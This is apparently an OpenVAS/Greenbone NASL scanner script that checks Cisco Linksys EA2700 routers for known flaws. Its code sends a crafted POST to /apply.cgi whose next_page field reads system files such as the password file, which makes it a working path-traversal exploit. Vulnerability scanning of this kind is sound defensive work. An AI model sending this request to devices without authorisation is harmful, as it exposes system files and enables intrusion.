# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103698");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Cisco Linksys EA2700 Router Multiple Security Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/59054");

  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-04-16 14:16:54 +0200 (Tue, 16 Apr 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("EA2700/banner");

  script_tag(name:"solution", value:"Firmware updates are available");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Cisco Linksys EA2700 routers is prone to the following security
  vulnerabilities:

  1. A security-bypass vulnerability

  2. A cross-site request-forgery vulnerability

  3. A cross-site scripting vulnerability");

  script_tag(name:"impact", value:"An attacker can exploit these issues to bypass certain security restrictions,
  steal cookie-based authentication credentials, gain access to system and other configuration files, or perform
  unauthorized actions in the context of a user session.");

  script_tag(name:"affected", value:"Cisco Linksys EA2700 running firmware 1.0.12.128947 is vulnerable.");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || "EA2700" >!< banner)exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

files = traversal_files("linux");

foreach pattern(keys(files)) {

  file = files[pattern];

  req = string("POST /apply.cgi HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "Accept-Encoding: identity\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
               "Accept-Language: en-us,en;q=0.5\r\n",
               "Proxy-Connection: keep-alive\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: 75\r\n",
               "\r\n",
               "submit_button=Wireless_Basic&change_action=gozila_cgi&next_page=/" + file);

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(egrep(string:result, pattern:pattern)) {
    security_message(data:"The target was found to be vulnerable", port:port);
    exit(0);
  }
}

exit(99);
